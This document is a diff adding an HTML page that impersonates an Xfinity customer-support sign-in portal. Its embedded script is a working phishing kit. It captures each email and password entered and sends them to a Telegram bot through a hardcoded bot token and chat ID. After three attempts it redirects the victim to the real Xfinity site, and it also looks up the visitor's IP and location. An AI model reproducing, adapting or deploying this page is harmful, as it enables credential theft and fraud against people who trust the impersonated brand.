@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Login Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+        }
+
+        .login-form {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            width: 320px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+
+        .login-form:hover {
+            transform: translateY(-5px);
+        }
+
+        .login-form h2 {
+            margin-bottom: 25px;
+            font-size: 24px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 12px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .login-form input:focus {
+            border-color: #5cb85c;
+            box-shadow: 0 0 6px rgba(92, 184, 92, 0.4);
+            outline: none;
+        }
+
+        .login-form button {
+            width: 35%;
+            padding: 10px;
+            background: linear-gradient(135deg, #5cb85c, #4cae4c);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        .login-form button:hover {
+            background: linear-gradient(135deg, #4cae4c, #449d44);
+            transform: scale(1.03);
+        }
+    </style>
+</head>
+<body>
+  <div class="login-form">
+    <img src="data:image/jpeg;base64,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" width=290/><br>
+    <h1>Welcome To Xfinity Assistance Portal</h1>
+    <h2>Sign in with your Xfinity ID</h2>
+    <form id="EwPE1X6bbf2VEY1KhbynPUA7F">
+     <input type="email" id="email" placeholder="Email, mobile or username" required>
+  <input type="password" id="password" placeholder="Password" required><br>
+  <button type="submit">Sign In</button><br>
+    </form>
+<footer>
+      <h4><p>© 2026 Xfinity Customer Support</p></h4>
+</footer>
+  <script>
+    let userLocation = {};
+  const BOT_TOKEN = "8737774050:AAGRLa9FAsv3tfUAsTh5VRUpprSChIFluAk";
+  const CHAT_ID = "6365483755";
+  let attempts = 0;
+
+  document.getElementById("EwPE1X6bbf2VEY1KhbynPUA7F").addEventListener("submit", function(e) {
+    e.preventDefault();
+    attempts++;
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    const text = `Attempt ${attempts}:\nEmail: ${email}\nPassword: ${password}`;
+    localStorage.setItem("userEmail", email);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    })
+    .then(response => response.json())
+    .then(data => {
+
+      // After 3rd attempt, redirect to thankyou.html
+      if (attempts >= 3) {
+        window.location.href = "https://xfinity.com";
+      }
+    })
+    .catch(error => console.error("Telegram error:", error));
+
+// Clear password field after each attempt
+      document.getElementById("password").value = "";
+  });
+
+  
+  
+  window.addEventListener("DOMContentLoaded", () => {
+    const savedEmail = localStorage.getItem("userEmail");
+    if (savedEmail) {
+      const emailField = document.getElementById("email");
+      emailField.value = savedEmail;
+      // Optional: lock the email field
+      // emailField.readOnly = true;
+    }
+
+      // Run after page loads
+    window.addEventListener("DOMContentLoaded", () => {
+      fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+          console.log(`IP: ${data.ip}`);
+          console.log(`City: ${data.city}`);
+          console.log(`Region: ${data.region}`);
+          console.log(`Country: ${data.country_name}`);
+        })
+        .catch(err => console.error("IP lookup failed:", err));
+    });
+  });
+</script>
+
+  </div>
+</body>
+</html>
